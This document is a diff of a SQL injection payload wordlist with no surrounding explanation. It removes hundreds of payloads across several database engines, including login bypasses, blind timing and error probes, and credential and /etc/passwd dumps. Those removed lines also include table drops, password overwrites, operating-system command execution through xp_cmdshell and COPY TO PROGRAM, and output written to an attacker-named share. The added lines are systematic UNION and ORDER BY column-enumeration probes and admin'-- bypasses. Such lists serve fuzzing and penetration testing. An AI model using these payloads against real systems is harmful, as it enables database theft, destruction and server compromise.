-{"filter":"' OR LENGTH(user())>0--"}
-{"q":"' UNION SELECT table_name FROM information_schema.tables--"}
-{"name":"' OR SLEEP(5)--"}
-{"email":"test@example.com' AND pg_sleep(5)--"}
-{"debug":"'||(SELECT version())||'"}
-{"meta":{"$ne":"1"},"user":"admin' -- "}
-{"jsonrpc":"2.0","method":"user.get","params":{"id":"1' OR '1'='1"}}
-{"payload":"%27%20OR%20%271%27%3D%271%27--%20"}
-?id=1' OR '1'='1
-?q=' UNION SELECT NULL,NULL--
-?cat=1;EXEC xp_cmdshell('dir');--
-?uid=1 AND SLEEP(5)--
-?p=1 OR BENCHMARK(5000000,MD5(1))--
-?ref=' OR 1=1 LIMIT 1--
-?term='||(SELECT version())||'
-?sort=1;SELECT pg_sleep(5);--
-?debug=true;DROP TABLE users;--
-?name=' OR 'a' LIKE 'a
-?filter=' OR EXISTS(SELECT 1 FROM users)--
-' UNION SELECT banner FROM v$version--
-'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'
-' AND dbms_pipe.receive_message('x',5)=0 --
-' AND UTL_INADDR.get_host_address('localhost') IS NOT NULL--
-' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--
-' UNION SELECT username,password FROM all_users WHERE ROWNUM=1--
-' UNION SELECT sys_context('userenv','current_user'),NULL FROM dual--
-' AND 1=(SELECT COUNT(*) FROM dual)--
-'||chr(65)||chr(66)||chr(67)||'
-1' UNION SELECT @@version,NULL--
-1' UNION SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--
-1' AND SUBSTRING(@@version,1,1)='M'--
-1';DECLARE @x NVARCHAR(100);SET @x=SYSTEM_USER;SELECT @x;--
-1';IF(1=1) EXEC master..xp_dirtree 'C:\\';--
-1';EXEC('SELECT name FROM sys.databases');--
-1' AND 1 IN (SELECT TOP 1 1 FROM sys.objects)--
-1';BEGIN;DROP TABLE tempdb..pwn;END;--
-1' UNION SELECT current_user,version()--
-1' AND CAST(current_setting('server_version') AS TEXT) LIKE '%9%'--
-1';COPY (SELECT user) TO PROGRAM 'id';--
-1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
-1' AND EXISTS(SELECT 1 FROM pg_roles)--
-1' AND pg_catalog.pg_sleep(3)--
-1' OR 1=(SELECT 1 FROM generate_series(1,1))--
-1' UNION SELECT pg_read_file('/etc/passwd',0,100),NULL--
-1' AND (SELECT COUNT(*) FROM pg_class)>0--
-1' AND @@version LIKE '5.%'--
-1' AND ORD(MID((SELECT USER()),1,1))>64--
-1' UNION SELECT @@version_compile_os,NULL--
-1' UNION SELECT @@datadir,NULL--
-1' AND GTID_SUBSET(@@GLOBAL.gtid_executed,'')--
-1' AND (SELECT SLEEP(5))--
-1' UNION SELECT TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE()--
-1' AND LOAD_FILE('/etc/hosts') IS NOT NULL--
-1' AND BENCHMARK(1000000,MD5('test'))--
-1' AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT DATABASE()),0x3a),NULL)--
-1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))--
-1' AND sqlite_version() NOT NULL--
-1' UNION SELECT name,sql FROM sqlite_master--
-1' AND (SELECT COUNT(*) FROM sqlite_master)>0--
-1' AND hex(randomblob(4))>0--
-1' UNION SELECT tbl_name,NULL FROM sqlite_master WHERE type='table'--
-' Or 1=1--
-' oR 1=1#
-'/**/OR/**/1=1--
-' oR '1'='1'/*
-') oR ('1'='1")
-'||(SELECT@@version)||'
-'/*! AND 1=1*/
-' OR 1=1 UNION/**/SELECT/**/NULL--
-' OR 1=1%0A--
-' OR 1=1%0D%0A--
-%27%09OR%091%3D1--
-%27%0aOR%0a1%3d1--
-<id>1' OR '1'='1</id>
-<user><![CDATA[' OR '1'='1]]></user>
-<name>' OR SLEEP(3)--</name>
-<x>' UNION SELECT version()--</x>
-{"xml":"' OR '1'='1"}
-{"node":"'||(SELECT user())||'"}
-999999999 OR 1=1
--9999 OR 'a'='a
-0E0 OR 1=1
-1E309 UNION SELECT 1,2,3
-1E0 OR SLEEP(2)--
--1 UNION SELECT version(),user()
-18446744073709551615 OR 1=1
-;DROP TABLE users;--
-'||(SELECT table_name FROM information_schema.tables LIMIT 1)||'
-') UNION SELECT NULL,NULL--
-||UTL_INADDR.get_host_address('127.0.0.1')||'
-'||pg_read_file('/etc/passwd',0,100)||'
-' and 1 in (select min(name) from sysobjects where xtype='U')--
-' AND 1 IN (SELECT COUNT(*) FROM users)--
-' AND EXISTS(SELECT 1 FROM dual)--
-'||(SELECT group_concat(tbl_name) FROM sqlite_master)||'
-1' AND 'x' LIKE 'x'--
-1' AND 'a' BETWEEN 'a' AND 'z'--
-1' AND '1' REGEXP '^[0-9]'--
-1' AND 1 IN (SELECT MIN(id) FROM users)--
-1' AND POSITION('admin' IN (SELECT group_concat(username) FROM users))>0--
-1' AND ascii(lower(substring(user(),1,1)))>96--
-Host: example.com' OR '1'='1
-Accept-Language: en-us' OR '1'='1--
-X-Custom: 1';SELECT version();--
-Forwarded: for=1.1.1.1;host=' OR 1=1--
-Cookie: lang=en';DROP TABLE audit;--
-User-Agent: Mozilla/5.0' AND SLEEP(3)--
-' UNION SELECT CONCAT(username,0x3a,password) FROM users--
-' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--
-' UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables--
-' UNION SELECT xmlagg(xmlelement(name,table_name)),NULL FROM information_schema.tables--
-' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables--
-1' AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END=1--
-1' AND IF((SELECT COUNT(*) FROM users)>0,1,SLEEP(5))--
-1' OR IF(1=1,1,(SELECT table_name FROM information_schema.tables))--
-1' AND (SELECT CASE WHEN SUBSTRING(USER(),1,1)='r' THEN SLEEP(3) ELSE 0 END)--
-1' AND (SELECT '{"a":1}'::json->>'a')='1'--
-1' AND (SELECT params->>'role' FROM config LIMIT 1)='admin'--
-1' AND (SELECT json_extract(data,'$.role') FROM config LIMIT 1)='admin'--
-1';CALL sleep(5);--
-1';CALL xp_regread('HKEY_LOCAL_MACHINE','SYSTEM','CurrentControlSet');--
-1';CALL dbms_lock.sleep(5);--
-1';SELECT * FROM mysql.user;--
-1' ORDER BY 1--
-1' ORDER BY 2--
-1' ORDER BY 3--
-1' ORDER BY 10--
-1' ORDER BY 100--
-1' LIMIT 0,1--
-1' LIMIT 1 OFFSET 1--
-1' LIMIT -1--
-1' LIMIT 0 UNION SELECT NULL--
-1' AND CAST((SELECT user()) AS CHAR)--
-1' AND CONVERT((SELECT database()) USING utf8)--
-1' AND CAST(1/0 AS INT)--
-1' AND CAST(password AS SIGNED) FROM users--
-1-1 UNION SELECT 1,2--
-1*1 UNION SELECT NULL,NULL--
-1/0 UNION SELECT NULL,NULL--
-1' OR 1=1- -
-1' AND user() LIKE 'r%'--
-1' AND database() LIKE '%test%'--
-1' AND table_name LIKE 'user%'--
-1' AND user() REGEXP '.*'--
-1' AND 'a' RLIKE 'a'--
-'/*test*/OR/*test*/'1'='1
-'/**/UNION/**/SELECT/**/NULL,NULL--
-' /*!50000UNION*/ SELECT 1,2--
-'/*!12345AND*/1=1--
-' OR '1'='1'/*
-' OR '1'='1'/**/
-' OR '1'='1'{%00}
-Cookie: data={"id":"1' OR '1'='1"}
-Authorization: Bearer abcdef' AND pg_sleep(5)--
-User-Agent: '||(SELECT current_database())||'
-X-Api-Version: v1';DROP TABLE api_keys;--
-Referer: https://site/?q=' OR 1=1--
-1' AND IF(LENGTH(USER())>0,1,0)--
-1' AND CASE WHEN (SELECT COUNT(*) FROM information_schema.tables)>0 THEN 1 ELSE 0 END--
-1' AND (SELECT 1 FROM users WHERE username='admin')=1--
-1' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>0--
-1' AND sleep(0.5)--
-1' AND SLEEP(2.5)--
-1' AND pg_sleep(0.5)--
-1' AND IF(STRCMP('a','a')=0,SLEEP(2),0)--
-1' XOR 1=1--
-1' NAND 1=1--
-1' OR TRUE--
-1' AND TRUE--
-1' OR '1'='1%00
-1' UNION SELECT NULL,NULL%00
-1;DROP TABLE users;%00
-1') OR ('1'='1
-1')) OR ((1=1)--
-1') UNION SELECT NULL,NULL--
-1') AND (SELECT pg_sleep(2))--
-1' AND (SELECT 1 FROM users LIMIT 1)=1 AND SLEEP(2)--
-1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 AND SLEEP(1)--
-1' GROUP BY CONCAT(username,0x3a,password) HAVING 1=1--
-1' GROUP BY table_schema HAVING COUNT(*)>0--
-' or '1'='1"?>
-' or 1=1<!--
-' UNION SELECT '<?xml version="' || version() || '"?>',NULL--
-1';UPDATE users SET password='hacked' WHERE username='admin';--
-1';UPDATE accounts SET balance=balance+1;--
-1' WITH x AS (SELECT version()) SELECT * FROM x--
-1' WITH q AS (SELECT pg_sleep(2)) SELECT * FROM q--
-1' OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
-1' FETCH FIRST 1 ROW ONLY--
-1' UNION DISTINCT SELECT NULL,NULL--
-1' UNION DISTINCT SELECT user(),database()--
-1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)a)=2--
-1' AND (SELECT MIN(username) FROM users)>'a'--
-1' AND (SELECT TOP 1 name FROM sys.objects) IS NOT NULL--
-' OR 1=1 -- -
-' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables--
-' UNION SELECT NULL,group_concat(username,':',password) FROM users--
-1' UNION SELECT TO_BASE64(user()),NULL--
-1' UNION SELECT encode(version(),'hex'),NULL--
-1' AND REVERSE('1')='1'--
-1' AND ELT(1,'a')='a'--
-1' AND (SELECT SLEEP(2) FROM dual)--
-1' AND (SELECT pg_sleep(2) FROM pg_catalog.pg_class LIMIT 1)--
-{"$ne":"1"}' OR '1'='1
-{"$gt":{}}' OR '1'='1
-1' UNION SELECT a.table_name,b.table_name FROM information_schema.tables a JOIN information_schema.tables b ON 1=1--
-1' UNION SELECT NULL,NULL FROM users u JOIN roles r ON u.id=r.user_id--
-1' CROSS JOIN pg_sleep(2)--
-1' CROSS JOIN generate_series(1,1)--
-1' AND ROW_NUMBER() OVER()=1--
-1' UNION SELECT DENSE_RANK() OVER(),table_name FROM information_schema.tables--
-1' UNION SELECT LOAD_FILE('file:///etc/passwd'),NULL--
-1' AND 'a' REGEXP 'a' AND SLEEP(1)--
-1';SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\win.ini', SINGLE_CLOB) AS x;--
-1';COPY (SELECT pg_sleep(2)) TO PROGRAM 'sleep 1';--
-1' INTO OUTFILE '\\\\attacker\\share\\dump.txt' SELECT user()--
-1' AND MBRCONTAINS(POLYGON((POINT(0,0),POINT(1,0),POINT(1,1),POINT(0,1),POINT(0,0))),POINT(0,0))--
-1' AND (SELECT BIT_COUNT(1))=1--
-1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--
-/*!50000' OR 1=1*/--
-1' UNION SELECT JSON_EXTRACT('{"a":1}','$.a'),NULL--
-1' AND SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),1,1)>'a'--
-1' AND SOUNDEX('test')=SOUNDEX('test')--
-1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-1' UNION SELECT sys.fn_varbintohexstr(password_hash),name FROM sys.sql_logins--
-' UNION SELECT user FROM dual--
-' UNION SELECT level FROM dual CONNECT BY level<3--
-1' UNION SELECT NULL,pragma_compile_options()--
-0x27204f5220313d31202d2d
-1';DECLARE @o INT;EXEC sp_oacreate 'wscript.shell',@o OUTPUT;EXEC sp_oamethod @o,'run',NULL,'calc';--
-1' AND lo_export(loid('/etc/passwd'),'/tmp/pwn')--
-Origin: https://example.com' OR 1=1--
-%ef%bc%87%20OR%20%ef%bc%871%ef%bc%87%3d%ef%bc%871--
-N' OR N'1'=N'1'--
-1' AND POW(2,1024)=POW(2,1024) AND SLEEP(1)--
-1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
-1' AND point(0,0) <@ box(point(-1,-1),point(1,1))--
-1' AND HASHBYTES('MD5','a') IS NOT NULL--
-1' COLLATE Latin1_General_CS_AS LIKE '1'--
-' OR MATCH(username,password) AGAINST ('admin')--
-';DECLARE @t INT;SET @t=5;WAITFOR DELAY '0:0:'+CAST(@t AS VARCHAR);--
-';DO $$BEGIN PERFORM pg_sleep(2); END$$;--
-';BEGIN DBMS_LOCK.SLEEP(2); END;--
-' AND hex(randomblob(8))>0--
-' AND GET_LOCK('abc',2)--
-' UNION SELECT * FROM JSON_TABLE('[{"a":1}]', '$[*]' COLUMNS(a INT PATH '$.a')) AS jt--
-1' AND (SELECT * FROM (SELECT pg_sleep(1))x)--
-' INTO DUMPFILE '/tmp/out.txt' SELECT user()--
-';CREATE FUNCTION do_something RETURNS INT SONAME 'lib.so';--
-';SELECT * FROM OPENQUERY(LOCALSERVER,'SELECT @@version');--
-1';SELECT pg_notify('chan',current_user);--
-1' UNION SELECT ROW_NUMBER() OVER(),table_name FROM information_schema.tables--
-1' INTERSECT SELECT 1--
-1' MINUS SELECT 1 FROM dual--
-' UNION SELECT 1 FROM dual--
-' AND SYS_CONTEXT('userenv','session_user') IS NOT NULL--
-1' AND to_char(now(),'YYYY')='2024'--
-';WITH t AS (SELECT 1 AS n) SELECT n,WAITFOR DELAY '0:0:2' FROM t;--
-1' UNION SELECT zeroblob(10),NULL--
-id=1/**/OR/**/1=1
-%27%0d%0aOR%0d%0a1%3d1--
-';PRINT @@version;--
-';CREATE TEMP TABLE t(x text);INSERT INTO t VALUES(pg_read_file('/etc/passwd',0,100));--
-1' AND ST_Contains(ST_GeomFromText('POLYGON((0 0,0 1,1 1,1 0,0 0))'),POINT(0,0))--
-1' AND (SELECT IF((SELECT COUNT(*) FROM users)>0,FLOOR(RAND()*2),0))--
-` OR `1`=`1`) OR (`1`=`1`
-1' AND updatexml(2,concat(0x3a,(SELECT database())),2)--
-1' AND quote_literal(current_user) IS NOT NULL--
-1' AND ST_LatFromGeoHash('u4pruydqqvj')>0--
-1' AND instr(user(),'a')>0--
-' UNION SELECT RAWTOHEX(user),NULL FROM dual--
-1' FOR XML PATH('pwn')--
-1' AND regexp_replace(version(),'[0-9]','x') IS NOT NULL--
-1' AND RPAD('a',1,'a')='a'--
-' AND EXTRACTVALUE(xmltype('<a>1</a>'),'/a')='1'--
-1' AND printf('%s',sqlite_version()) IS NOT NULL--
-1' AND OPENJSON('{"a":1}') IS NOT NULL--
-1' AND jsonb_extract_path_text('{"a":1}'::jsonb,'a')='1'--
-1' AND EXP(1)=EXP(1)--
-1' AND MD5('a')=MD5('a')--
-1' AND SHA1('a')=SHA1('a')--
-1' AND FROM_BASE64(TO_BASE64('a'))='a'--
-1' AND AES_ENCRYPT('a','k') IS NOT NULL--
-1' AND encode(compress('a'),'hex') IS NOT NULL--
-1' AND STUFF('test',1,1,'T')='Test'--
-' AND NVL('a','b')='a'--
-1' AND replace('aa','a','a')='a'--
-%27%20OR%20%271%27%3D%271--
-%27+OR+%271%27%3D%271--
-%2527%2520OR%2520%25271%2527%253D%25271--
-1%27%20AND%20SLEEP%285%29--
-1%27+AND+SLEEP%285%29--
-1%2527%2520AND%2520SLEEP%25285%2529--
-1%27%20UNION%20SELECT%20NULL%2CNULL--
-1%27+UNION+SELECT+NULL%2CNULL--
-1%2527%2520UNION%2520SELECT%2520NULL%252CNULL--
-1--
-1' --
-' OR '1'='1 --
-1-- -
-1' -- -
-' OR '1'='1 -- -
-1#
-1' #
-' OR '1'='1 #
-1/*
-1' /*
-' OR '1'='1 /*
-1;%00
-1' ;%00
-' OR '1'='1 ;%00
-1--%20
-1' --%20
-' OR '1'='1 --%20
-1--+
-1' --+
-' OR '1'='1 --+
-1--|
-1' --|
-' OR '1'='1 --|
-1--/**/
-1' --/**/
-' OR '1'='1 --/**/
--1 UNION SELECT NULL
--1 UNION ALL SELECT NULL
--1 UNION SELECT NULL,NULL
--1 UNION ALL SELECT NULL,NULL
--1 UNION SELECT NULL,NULL,NULL
--1 UNION ALL SELECT NULL,NULL,NULL
--1 UNION SELECT NULL,NULL,NULL,NULL
--1 UNION ALL SELECT NULL,NULL,NULL,NULL
--1 UNION SELECT NULL,NULL,NULL,NULL,NULL
--1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL
--1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
--1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL
-1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27%3B--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;%00
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/*
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+' ORDER BY 1 --
+' GROUP BY 1 --
+' HAVING 1=1 --
+' ORDER BY 1 -- +
+' GROUP BY 1 -- +
+' HAVING 1=1 -- +
+' ORDER BY 1 --%20
+' GROUP BY 1 --%20
+' HAVING 1=1 --%20
+' ORDER BY 1 #
+' GROUP BY 1 #
+' HAVING 1=1 #
+' ORDER BY 1 /*
+' GROUP BY 1 /*
+' HAVING 1=1 /*
+' ORDER BY 1
+' GROUP BY 1
+' HAVING 1=1
+' ORDER BY 2 --
+' GROUP BY 2 --
+' ORDER BY 2 -- +
+' GROUP BY 2 -- +
+' ORDER BY 2 --%20
+' GROUP BY 2 --%20
+' ORDER BY 2 #
+' GROUP BY 2 #
+' ORDER BY 2 /*
+' GROUP BY 2 /*
+' ORDER BY 2
+' GROUP BY 2
+' ORDER BY 3 --
+' GROUP BY 3 --
+' ORDER BY 3 -- +
+' GROUP BY 3 -- +
+' ORDER BY 3 --%20
+' GROUP BY 3 --%20
+' ORDER BY 3 #
+' GROUP BY 3 #
+' ORDER BY 3 /*
+' GROUP BY 3 /*
+' ORDER BY 3
+' GROUP BY 3
+' ORDER BY 4 --
+' GROUP BY 4 --
+' ORDER BY 4 -- +
+' GROUP BY 4 -- +
+' ORDER BY 4 --%20
+' GROUP BY 4 --%20
+' ORDER BY 4 #
+' GROUP BY 4 #
+' ORDER BY 4 /*
+' GROUP BY 4 /*
+' ORDER BY 4
+' GROUP BY 4
+' ORDER BY 5 --
+' GROUP BY 5 --
+' ORDER BY 5 -- +
+' GROUP BY 5 -- +
+' ORDER BY 5 --%20
+' GROUP BY 5 --%20
+' ORDER BY 5 #
+' GROUP BY 5 #
+' ORDER BY 5 /*
+' GROUP BY 5 /*
+' ORDER BY 5
+' GROUP BY 5
+' ORDER BY 6 --
+' GROUP BY 6 --
+' ORDER BY 6 -- +
+' GROUP BY 6 -- +
+' ORDER BY 6 --%20
+' GROUP BY 6 --%20
+' ORDER BY 6 #
+' GROUP BY 6 #
+' ORDER BY 6 /*
+' GROUP BY 6 /*
+' ORDER BY 6
+' GROUP BY 6
+' ORDER BY 7 --
+' GROUP BY 7 --
+' ORDER BY 7 -- +
+' GROUP BY 7 -- +
+' ORDER BY 7 --%20
+' GROUP BY 7 --%20
+' ORDER BY 7 #
+' GROUP BY 7 #
+' ORDER BY 7 /*
+' GROUP BY 7 /*
+' ORDER BY 7
+' GROUP BY 7
+' ORDER BY 8 --
+' GROUP BY 8 --
+' ORDER BY 8 -- +
+' GROUP BY 8 -- +
+' ORDER BY 8 --%20
+' GROUP BY 8 --%20
+' ORDER BY 8 #
+' GROUP BY 8 #
+' ORDER BY 8 /*
+' GROUP BY 8 /*
+' ORDER BY 8
+' GROUP BY 8
+' ORDER BY 9 --
+' GROUP BY 9 --
+' ORDER BY 9 -- +
+' GROUP BY 9 -- +
+' ORDER BY 9 --%20
+' GROUP BY 9 --%20
+' ORDER BY 9 #
+' GROUP BY 9 #
+' ORDER BY 9 /*
+' GROUP BY 9 /*
+' ORDER BY 9
+' GROUP BY 9
+' ORDER BY 10 --
+' GROUP BY 10 --
+' ORDER BY 10 -- +
+' GROUP BY 10 -- +
+' ORDER BY 10 --%20
+' GROUP BY 10 --%20
+' ORDER BY 10 #
+' GROUP BY 10 #
+' ORDER BY 10 /*
+' GROUP BY 10 /*
+' ORDER BY 10
+' GROUP BY 10
+' ORDER BY 11 --
+' GROUP BY 11 --
+' ORDER BY 11 -- +
+' GROUP BY 11 -- +
+' ORDER BY 11 --%20
+' GROUP BY 11 --%20
+' ORDER BY 11 #
+' GROUP BY 11 #
+' ORDER BY 11 /*
+' GROUP BY 11 /*
+' ORDER BY 11
+' GROUP BY 11
+' ORDER BY 12 --
+' GROUP BY 12 --
+' ORDER BY 12 -- +
+' GROUP BY 12 -- +
+' ORDER BY 12 --%20
+' GROUP BY 12 --%20
+' ORDER BY 12 #
+' GROUP BY 12 #
+' ORDER BY 12 /*
+' GROUP BY 12 /*
+' ORDER BY 12
+' GROUP BY 12
+' ORDER BY 13 --
+' GROUP BY 13 --
+' ORDER BY 13 -- +
+' GROUP BY 13 -- +
+' ORDER BY 13 --%20
+' GROUP BY 13 --%20
+' ORDER BY 13 #
+' GROUP BY 13 #
+' ORDER BY 13 /*
+' GROUP BY 13 /*
+' ORDER BY 13
+' GROUP BY 13
+' ORDER BY 14 --
+' GROUP BY 14 --
+' ORDER BY 14 -- +
+' GROUP BY 14 -- +
+' ORDER BY 14 --%20
+' GROUP BY 14 --%20
+' ORDER BY 14 #
+' GROUP BY 14 #
+' ORDER BY 14 /*
+' GROUP BY 14 /*
+' ORDER BY 14
+' GROUP BY 14
+' ORDER BY 15 --
+' GROUP BY 15 --
+' ORDER BY 15 -- +
+' GROUP BY 15 -- +
+' ORDER BY 15 --%20
+' GROUP BY 15 --%20
+' ORDER BY 15 #
+' GROUP BY 15 #
+' ORDER BY 15 /*
+' GROUP BY 15 /*
+' ORDER BY 15
+' GROUP BY 15
+' ORDER BY 16 --
+' GROUP BY 16 --
+' ORDER BY 16 -- +
+' GROUP BY 16 -- +
+' ORDER BY 16 --%20
+' GROUP BY 16 --%20
+' ORDER BY 16 #
+' GROUP BY 16 #
+' ORDER BY 16 /*
+' GROUP BY 16 /*
+' ORDER BY 16
+' GROUP BY 16
+' ORDER BY 17 --
+' GROUP BY 17 --
+' ORDER BY 17 -- +
+' GROUP BY 17 -- +
+' ORDER BY 17 --%20
+' GROUP BY 17 --%20
+' ORDER BY 17 #
+' GROUP BY 17 #
+' ORDER BY 17 /*
+' GROUP BY 17 /*
+' ORDER BY 17
+' GROUP BY 17
+' ORDER BY 18 --
+' GROUP BY 18 --
+' ORDER BY 18 -- +
+' GROUP BY 18 -- +
+' ORDER BY 18 --%20
+' GROUP BY 18 --%20
+' ORDER BY 18 #
+' GROUP BY 18 #
+' ORDER BY 18 /*
+' GROUP BY 18 /*
+' ORDER BY 18
+' GROUP BY 18
+' ORDER BY 19 --
+' GROUP BY 19 --
+' ORDER BY 19 -- +
+' GROUP BY 19 -- +
+' ORDER BY 19 --%20
+' GROUP BY 19 --%20
+' ORDER BY 19 #
+' GROUP BY 19 #
+' ORDER BY 19 /*
+' GROUP BY 19 /*
+' ORDER BY 19
+' GROUP BY 19
+' ORDER BY 20 --
+' GROUP BY 20 --
+' ORDER BY 20 -- +
+' GROUP BY 20 -- +
+' ORDER BY 20 --%20
+' GROUP BY 20 --%20
+' ORDER BY 20 #
+' GROUP BY 20 #
+' ORDER BY 20 /*
+' GROUP BY 20 /*
+' ORDER BY 20
+' GROUP BY 20
+admin'--
+admin' #
+" admin" --
+' AND ''='
+' OR 'x'='x' --
+' OR 'x'='x'/*
+') OR ('x'='x'--
+') OR ('x'='x'/*
+" OR "x"="x"--
+" OR "x"="x"/*
+'`OR`'1'='1'--
